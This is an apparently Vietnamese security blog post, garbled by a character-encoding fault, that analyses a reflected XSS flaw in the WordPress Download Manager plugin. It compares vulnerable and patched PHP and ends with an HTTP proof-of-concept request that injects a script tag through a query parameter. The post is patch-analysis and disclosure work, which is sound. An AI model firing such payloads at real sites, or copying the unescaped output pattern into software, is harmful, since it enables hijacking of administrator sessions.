# CVE-2025-10146 Analysis & POC


<!--more-->

Lá»— há»•ng trong plugin **Download Manager** trÆ°á»›c phiÃªn báº£n **3.3.24**. Dá»¯ liá»‡u Ä‘Æ°á»£c láº¥y tá»« **GET** request Ä‘Æ°á»£c in trá»±c tiáº¿p vÃ o **HTML attribute**, **reflected XSS** xáº£y ra khi ngÆ°á»i dÃ¹ng cÃ³ Ä‘áº·c quyá»n truy cáº­p vÃ o Ä‘Æ°á»ng dáº«n do attack cung cáº¥p.

* **CVE ID**: [CVE-2025-10146](https://www.cve.org/CVERecord?id=CVE-2025-10146)
* **Product**: [WordPress Download Manager Plugin](https://wordpress.org/plugins/download-manager)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 3.3.23
* **CVSS severity**: Medium (7.1)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Download Manager**: v3.3.23(vul) vÃ  v3.3.24(fix)
* **diff tool**: **meld** hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version

## Analysis

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file **src/Admin/views/stats/history.php**.

**Báº£n lá»—i**:

```php
<?php if (!empty($user_ids)): ?>
    <div class="clear-filter">
        <?php
        $get_params_xu = $get_params;
        unset($get_params_xu['user_ids']);
        $reset_url = add_query_arg($get_params_xu, 'edit.php');
        ?>
        <a href="<?php echo $reset_url; ?>" class="clear-btn" title="<?php _e('Clear user filter', 'download-manager'); ?>">
            <i class="fas fa-times"></i>
        </a>
    </div>
<?php endif; ?>
```

Láº¥y **GET params** vÃ  gÃ¡n trá»±c tiáº¿p vÃ o **href** cá»§a tháº» `<a>` mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ báº£o vá»‡ => nguy cÆ¡ **reflected XSS**.

**Báº£n vÃ¡**:

```php
<?php if (!empty($user_ids)): ?>
    <div class="clear-filter">
        <?php
        $get_params_xu = $get_params;
        unset($get_params_xu['user_ids']);
        $get_params_xu = \WPDM\__\__::sanitize_array($get_params_xu, 'safetxt');

        $reset_url = add_query_arg($get_params_xu, 'edit.php');
        ?>
        <a href="<?php echo esc_url($reset_url); ?>" class="clear-btn" title="<?php _e('Clear user filter', 'download-manager'); ?>">
            <i class="fas fa-times"></i>
        </a>
    </div>
<?php endif; ?>
```

{{< figure src="patch_diff.png" caption="Patch Diff: sanitized GET parameters and escaped URL" >}}

Báº£n vÃ¡ Ä‘Ã£ **sanitize** máº£ng **GET params** báº±ng `sanitize_array` vÃ  sá»­ dá»¥ng `esc_url`  Ä‘á»ƒ **escape URL** => an toÃ n hÆ¡n.

### How It Work?

Ta cáº§n tÃ¬m URL thá»±c sá»± Ä‘á»ƒ inject GET params chá»©a XSS payload.

**src/Admin/views/stats/history.php** chá»©a cÃ¡c tag **php**, **HTML** vÃ  náº±m trong **views** cho tháº¥y file nÃ y Ä‘Æ°á»£c include á»Ÿ nÆ¡i nÃ o Ä‘Ã³ trong mÃ£ nguá»“n plugin.

Ta tÃ¬m vá»›i tá»« khÃ³a `history.php` trong thÆ° má»¥c plugin

{{< figure src="search1.png" caption="Search results for history.php" >}}

ğŸ‘‰ KhÃ´ng cÃ³ káº¿t quáº£ nÃ o khá»›p. Kháº£ nÄƒng cao nÃ³ Ä‘Æ°á»£c include Ä‘á»™ng nhÆ° nÃ y `{$file_name}.php`. Ta tÃ¬m vá»›i regex `\{.*\}\.php`:

{{< figure src="regex.png" caption="Regex search for dynamic includes" >}}

**src/Admin/views/stats/history.php** Ä‘Æ°á»£c include trong **src/Admin/views/stats.php**

URL thá»±c sá»± Ä‘á»ƒ truy cáº­p Ä‘Æ°á»£c khai bÃ¡o á»Ÿ Ä‘áº§u file **stats.php**

```
$base_page_uri = "edit.php?post_type=wpdmpro&page=wpdm-stats";
```

TÆ°Æ¡ng tá»± **history.php**, **stats.php** cÅ©ng Ä‘Æ°á»£c include á»Ÿ Ä‘Ã¢u Ä‘Ã³ trong mÃ£ nguá»“n plugin. NhÆ°ng khÃ´ng cáº§n quan tÃ¢m vÃ¬ ta Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c URL thá»±c sá»±.

Äá»ƒ cháº¯c cháº¯n hÆ¡n, ta Ä‘áº·t **breakpoint** táº¡i vá»‹ trÃ­ lá»— há»•ng trong file **src/Admin/views/stats/history.php**, sau Ä‘Ã³ báº¯t Ä‘áº§u debug vÃ  truy cáº­p URL:

```
edit.php?post_type=wpdmpro&page=wpdm-stats
```

{{< figure src="debug.png" caption="Breakpoint debugging to observe GET params" >}}

TrÆ°á»›c tiÃªn, plugin láº¥y toÃ n bá»™ **GET parameters** vÃ o `$get_params`.

Náº¿u `$user_ids` khÃ´ng rá»—ng, plugin sáº½ táº¡o **nÃºt â€œClear filterâ€**. Äá»ƒ lÃ m nÃºt nÃ y hoáº¡t Ä‘á»™ng, cáº§n má»™t URL mÃ  **khÃ´ng cÃ²n `user_ids`** ná»¯a, nÃªn plugin lÃ m nhÆ° sau:

```php
$get_params_xu = $get_params;        // copy toÃ n bá»™ GET parameters
unset($get_params_xu['user_ids']);   // bá» user_ids ra khá»i máº£ng
$reset_url = add_query_arg($get_params_xu, 'edit.php'); // táº¡o URL má»›i
```

* `unset($get_params_xu['user_ids'])` => loáº¡i bá» bá»™ lá»c `user_ids` khá»i URL.
* `add_query_arg($get_params_xu, 'edit.php')` > táº¡o URL má»›i vá»›i cÃ¡c tham sá»‘ cÃ²n láº¡i.

Cuá»‘i cÃ¹ng, URL nÃ y Ä‘Æ°á»£c gáº¯n vÃ o nÃºt â€œClear filterâ€:

```php
<a href="<?php echo $reset_url; ?>" class="clear-btn">...</a>
```

**Káº¿t quáº£:** Khi ngÆ°á»i dÃ¹ng nháº¥n nÃºt, trang sáº½ load láº¡i **mÃ  khÃ´ng cÃ²n bá»™ lá»c user_ids**, tá»©c lÃ  `â€œclear filterâ€`.

## Exploit

### Detect XSS

Gá»­i GET request chá»©a XSS payload:

```http
GET /wp-admin/edit.php?post_type=wpdmpro&page=wpdm-stats&user_ids[0]=1&payload="></a><script>alert(document.domain)</script> HTTP/1.1
```

Ta thÃªm `"></a>` Ä‘á»ƒ Ä‘Ã³ng tháº» `<a>` sau Ä‘Ã³ thÃªm 1 script dá»ƒ `alert()`

{{< figure src="xss.png" caption="Reflected XSS triggered via GET parameter" >}}

ğŸ‘‰ XSS thÃ nh cÃ´ng, khi ngÆ°á»i dÃ¹ng cÃ³ Ä‘áº·c quyá»n truy cáº­p vÃ o URL do attacker cung cáº¥p thÃ¬ **reflected XSS** xáº£y ra => Xáº£y ra Ä‘Ãºng ká»‹ch báº£n **Unauthenticated**

## Conclusion

Lá»— há»•ng **CVE-2025-10146** trong plugin **WordPress Download Manager <= 3.3.23** lÃ  **reflected XSS**, xáº£y ra khi dá»¯ liá»‡u tá»« **GET request** Ä‘Æ°á»£c in trá»±c tiáº¿p vÃ o **HTML attribute** mÃ  khÃ´ng Ä‘Æ°á»£c sanitize hoáº·c escape. NgÆ°á»i dÃ¹ng cÃ³ quyá»n truy cáº­p vÃ o Ä‘Æ°á»ng dáº«n nÃ y (admin/author) cÃ³ thá»ƒ bá»‹ táº¥n cÃ´ng náº¿u truy cáº­p URL do attacker táº¡o.

Báº£n vÃ¡ **3.3.24** Ä‘Ã£:

1. **Sanitize máº£ng GET parameters** (`sanitize_array`) Ä‘á»ƒ loáº¡i bá» kÃ½ tá»± nguy hiá»ƒm.
2. **Escape URL** khi in ra HTML (`esc_url`) Ä‘á»ƒ ngÄƒn XSS.

**Key takeaways**:

* LuÃ´n **sanitize vÃ  escape dá»¯ liá»‡u** tá»« ngÆ°á»i dÃ¹ng trÆ°á»›c khi render ra HTML.
* Kiá»ƒm tra **quyá»n truy cáº­p** trÆ°á»›c khi xá»­ lÃ½ hoáº·c hiá»ƒn thá»‹ dá»¯ liá»‡u nháº¡y cáº£m.
* Ngay cáº£ cÃ¡c role tháº¥p (contributor) váº«n cÃ³ thá»ƒ trá»Ÿ thÃ nh Ä‘iá»ƒm táº¥n cÃ´ng náº¿u plugin khÃ´ng báº£o vá»‡ Ä‘Ãºng cÃ¡ch.
* Cáº­p nháº­t plugin thÆ°á»ng xuyÃªn lÃ  cÃ¡ch phÃ²ng thá»§ Ä‘Æ¡n giáº£n nhÆ°ng hiá»‡u quáº£ nháº¥t.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress Download Manager Plugin <= 3.3.24 is vulnerable to Cross Site Scripting (XSS)](https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-3-23-reflected-cross-site-scripting-via-user-ids-parameter-vulnerability)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/  

